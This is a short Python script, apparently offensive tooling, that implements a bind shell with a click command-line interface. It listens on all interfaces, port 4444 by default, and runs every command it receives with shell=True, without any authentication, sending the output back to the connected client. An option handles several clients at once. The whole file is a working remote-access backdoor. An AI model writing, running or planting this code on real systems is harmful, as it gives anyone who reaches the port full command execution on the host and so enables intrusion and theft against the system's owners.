import socket
import subprocess
import threading

import click


def handle_client(conn, address):
    """Serve a single connected client: run commands and return output."""
    print(f'[+] connection from {address}')
    with conn:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            cmd = data.decode('utf-8', errors='strict').strip()
            if not cmd:
                continue
            if cmd.lower() == 'exit':
                break
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, timeout=30
                )
                output = result.stdout + result.stderr
            except subprocess.TimeoutExpired:
                output = b'[!] command timed out\n'
            except Exception as exc:
                output = f'[!] error: {exc}\n'.encode()
            conn.send(output)
    print(f'[-] disconnected from {address}')


@click.command()
@click.option('--port', '-p', default=4444, show_default=True, help='Port to listen on.')
@click.option('--threaded', '-t', is_flag=True, help='Handle multiple clients concurrently.')
def main(port, threaded):
    """Start a bind shell listening on the given port."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f'[*] listening on 0.0.0.0:{port}')
    try:
        while True:
            conn, address = server.accept()
            if threaded:
                threading.Thread(
                    target=handle_client, args=(conn, address), daemon=True
                ).start()
            else:
                handle_client(conn, address)
    finally:
        server.close()


if __name__ == '__main__':
    main()
